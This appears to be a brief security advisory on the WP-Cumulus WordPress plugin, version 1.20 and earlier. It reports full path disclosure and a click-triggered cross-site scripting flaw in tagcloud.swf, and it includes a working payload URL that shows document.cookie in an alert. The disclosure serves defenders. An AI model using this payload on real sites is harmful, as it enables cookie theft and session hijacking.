I want to warn you about security vulnerabilities in plugin WP-Cumulus for
WordPress.

These are Full path disclosure and Cross-Site Scripting vulnerabilities.

Full path disclosure:

http://server/wp-content/plugins/wp-cumulus/wp-cumulus.php

XSS:

http://server/wp-content/plugins/wp-cumulus/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

Code will execute after click. It's strictly social XSS.

Vulnerable are WP-Cumulus 1.20 and previous versions.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/3665/).

P.S.

Best wishes & regards,
